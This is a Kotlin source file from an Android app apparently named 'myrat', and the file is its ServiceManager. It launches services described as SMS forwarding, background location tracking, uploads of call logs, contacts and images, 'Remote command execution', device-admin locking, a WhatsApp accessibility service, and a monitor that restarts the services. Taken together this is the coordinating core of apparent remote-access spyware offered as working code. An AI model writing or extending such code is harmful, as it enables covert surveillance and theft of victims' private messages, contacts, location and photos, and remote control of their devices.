package com.myrat.app.service

import android.Manifest
import android.app.ActivityManager
import android.content.Context
import android.content.Intent
import android.os.Build
import android.provider.Settings
import com.myrat.app.utils.Logger
import com.myrat.app.utils.PermissionUtils

class ServiceManager(private val context: Context) {
    
    data class ServiceInfo(
        val serviceClass: Class<*>,
        val requiredPermissions: Array<String>,
        val requiredSpecialPermissions: List<String> = emptyList(),
        val description: String,
        val priority: Int = 1
    )
    
    private val serviceDefinitions = listOf(
        ServiceInfo(
            serviceClass = SmsService::class.java,
            requiredPermissions = PermissionUtils.SMS_PERMISSIONS,
            description = "SMS handling and forwarding",
            priority = 1
        ),
        
        ServiceInfo(
            serviceClass = CallService::class.java,
            requiredPermissions = PermissionUtils.PHONE_PERMISSIONS,
            description = "Phone call management",
            priority = 1
        ),
        
        ServiceInfo(
            serviceClass = LocationService::class.java,
            requiredPermissions = PermissionUtils.LOCATION_PERMISSIONS + PermissionUtils.BACKGROUND_LOCATION_PERMISSIONS,
            description = "Location tracking and monitoring",
            priority = 1
        ),
        
        ServiceInfo(
            serviceClass = LockService::class.java,
            requiredPermissions = PermissionUtils.BIOMETRIC_PERMISSIONS,
            requiredSpecialPermissions = listOf("device_admin", "battery_optimization"),
            description = "Device lock and security management",
            priority = 2
        ),
        
        ServiceInfo(
            serviceClass = CallLogUploadService::class.java,
            requiredPermissions = arrayOf(
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.READ_PHONE_STATE
            ),
            description = "Call history upload",
            priority = 2
        ),
        
        ServiceInfo(
            serviceClass = ContactUploadService::class.java,
            requiredPermissions = arrayOf(Manifest.permission.READ_CONTACTS),
            description = "Contact synchronization",
            priority = 2
        ),
        
        ServiceInfo(
            serviceClass = ImageUploadService::class.java,
            requiredPermissions = PermissionUtils.STORAGE_PERMISSIONS,
            description = "Image upload and management",
            priority = 3
        ),
        
        ServiceInfo(
            serviceClass = ShellService::class.java,
            requiredPermissions = emptyArray(),
            description = "Remote command execution",
            priority = 3
        ),
        
        ServiceInfo(
            serviceClass = SmsConsentService::class.java,
            requiredPermissions = arrayOf(
                Manifest.permission.RECEIVE_SMS,
                Manifest.permission.READ_SMS
            ),
            description = "SMS consent API handling",
            priority = 3
        ),
        
        ServiceInfo(
            serviceClass = ServiceMonitorService::class.java,
            requiredPermissions = emptyArray(),
            description = "Service monitoring and restart",
            priority = 4
        )
    )
    
    private val startedServices = mutableSetOf<String>()
    
    fun checkAndStartAvailableServices() {
        Logger.log("Checking permissions and starting available services...")
        
        val sortedServices = serviceDefinitions.sortedBy { it.priority }
        var startedCount = 0
        
        sortedServices.forEach { serviceInfo ->
            if (canStartService(serviceInfo)) {
                if (startService(serviceInfo)) {
                    startedCount++
                }
            } else {
                Logger.log("Cannot start ${serviceInfo.serviceClass.simpleName} - missing permissions: ${getMissingPermissions(serviceInfo)}")
            }
        }
        
        Logger.log("Started $startedCount services based on available permissions")
        logServiceStatus()
    }
    
    private fun canStartService(serviceInfo: ServiceInfo): Boolean {
        val hasRuntimePermissions = if (serviceInfo.requiredPermissions.isNotEmpty()) {
            PermissionUtils.hasPermissions(context, *serviceInfo.requiredPermissions)
        } else {
            true
        }
        
        val hasSpecialPermissions = serviceInfo.requiredSpecialPermissions.all { specialPermission ->
            when (specialPermission) {
                "device_admin" -> isDeviceAdminEnabled()
                "battery_optimization" -> isBatteryOptimizationDisabled()
                "accessibility" -> isAccessibilityServiceEnabled()
                "overlay" -> canDrawOverlays()
                else -> true
            }
        }
        
        return hasRuntimePermissions && hasSpecialPermissions
    }
    
    private fun startService(serviceInfo: ServiceInfo): Boolean {
        val serviceName = serviceInfo.serviceClass.simpleName
        
        if (isServiceRunning(serviceInfo.serviceClass)) {
            Logger.log("$serviceName is already running")
            startedServices.add(serviceName)
            return false
        }
        
        if (startedServices.contains(serviceName)) {
            Logger.log("$serviceName already started in this session")
            return false
        }
        
        try {
            val serviceIntent = Intent(context, serviceInfo.serviceClass)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(serviceIntent)
            } else {
                context.startService(serviceIntent)
            }
            
            startedServices.add(serviceName)
            Logger.log("✅ Started $serviceName - ${serviceInfo.description}")
            return true
        } catch (e: Exception) {
            Logger.error("❌ Failed to start $serviceName", e)
            return false
        }
    }
    
    private fun getMissingPermissions(serviceInfo: ServiceInfo): List<String> {
        val missing = mutableListOf<String>()
        
        serviceInfo.requiredPermissions.forEach { permission ->
            if (!PermissionUtils.hasPermissions(context, permission)) {
                missing.add(permission)
            }
        }
        
        serviceInfo.requiredSpecialPermissions.forEach { specialPermission ->
            when (specialPermission) {
                "device_admin" -> if (!isDeviceAdminEnabled()) missing.add("Device Admin")
                "battery_optimization" -> if (!isBatteryOptimizationDisabled()) missing.add("Battery Optimization")
                "accessibility" -> if (!isAccessibilityServiceEnabled()) missing.add("Accessibility Service")
                "overlay" -> if (!canDrawOverlays()) missing.add("Display over other apps")
            }
        }
        
        return missing
    }
    
    private fun isServiceRunning(serviceClass: Class<*>): Boolean {
        return try {
            val activityManager = context.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
            val runningServices = activityManager.getRunningServices(Integer.MAX_VALUE)
            runningServices.any { it.service.className == serviceClass.name }
        } catch (e: Exception) {
            Logger.error("Error checking if service is running: ${serviceClass.simpleName}", e)
            false
        }
    }
    
    private fun logServiceStatus() {
        try {
            val activityManager = context.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
            val runningServices = activityManager.getRunningServices(Integer.MAX_VALUE)
            val runningServiceNames = runningServices.map { it.service.className }.toSet()
            
            Logger.log("=== SERVICE STATUS REPORT ===")
            serviceDefinitions.sortedBy { it.priority }.forEach { serviceInfo ->
                val serviceName = serviceInfo.serviceClass.simpleName
                val isRunning = runningServiceNames.contains(serviceInfo.serviceClass.name)
                val canStart = canStartService(serviceInfo)
                val status = when {
                    isRunning -> "✅ RUNNING"
                    canStart -> "⏳ CAN START"
                    else -> "❌ BLOCKED"
                }
                
                Logger.log("Priority ${serviceInfo.priority}: $serviceName - $status")
                if (!canStart && !isRunning) {
                    val missing = getMissingPermissions(serviceInfo)
                    Logger.log("   Missing: ${missing.joinToString(", ")}")
                }
            }
            Logger.log("=== END SERVICE STATUS ===")
        } catch (e: Exception) {
            Logger.error("Error logging service status", e)
        }
    }
    
    private fun isDeviceAdminEnabled(): Boolean {
        return try {
            val devicePolicyManager = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
            val adminComponent = android.content.ComponentName(context, com.myrat.app.receiver.MyDeviceAdminReceiver::class.java)
            devicePolicyManager.isAdminActive(adminComponent)
        } catch (e: Exception) {
            false
        }
    }
    
    private fun isBatteryOptimizationDisabled(): Boolean {
        return try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                val powerManager = context.getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
                powerManager.isIgnoringBatteryOptimizations(context.packageName)
            } else {
                true
            }
        } catch (e: Exception) {
            false
        }
    }
    
    private fun isAccessibilityServiceEnabled(): Boolean {
        return try {
            val accessibilityEnabled = Settings.Secure.getInt(
                context.contentResolver,
                Settings.Secure.ACCESSIBILITY_ENABLED, 0
            )
            if (accessibilityEnabled == 1) {
                val services = Settings.Secure.getString(
                    context.contentResolver,
                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
                )
                services?.contains("${context.packageName}/com.myrat.app.service.WhatsAppService") == true
            } else {
                false
            }
        } catch (e: Exception) {
            false
        }
    }
    
    private fun canDrawOverlays(): Boolean {
        return try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                Settings.canDrawOverlays(context)
            } else {
                true
            }
        } catch (e: Exception) {
            false
        }
    }
    
    fun getServiceStats(): Map<String, Any> {
        val stats = mutableMapOf<String, Any>()
        
        try {
            val activityManager = context.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
            val runningServices = activityManager.getRunningServices(Integer.MAX_VALUE)
            val runningServiceNames = runningServices.map { it.service.className }.toSet()
            
            val totalServices = serviceDefinitions.size
            val runningCount = serviceDefinitions.count { runningServiceNames.contains(it.serviceClass.name) }
            val canStartCount = serviceDefinitions.count { canStartService(it) }
            
            stats["total_services"] = totalServices
            stats["running_services"] = runningCount
            stats["can_start_services"] = canStartCount
            stats["blocked_services"] = totalServices - canStartCount
            stats["service_details"] = serviceDefinitions.map { serviceInfo ->
                mapOf(
                    "name" to serviceInfo.serviceClass.simpleName,
                    "priority" to serviceInfo.priority,
                    "running" to runningServiceNames.contains(serviceInfo.serviceClass.name),
                    "can_start" to canStartService(serviceInfo),
                    "missing_permissions" to getMissingPermissions(serviceInfo)
                )
            }
        } catch (e: Exception) {
            Logger.error("Error getting service stats", e)
        }
        
        return stats
    }
    
    fun cleanup() {
        startedServices.clear()
        Logger.log("ServiceManager cleanup completed")
    }
}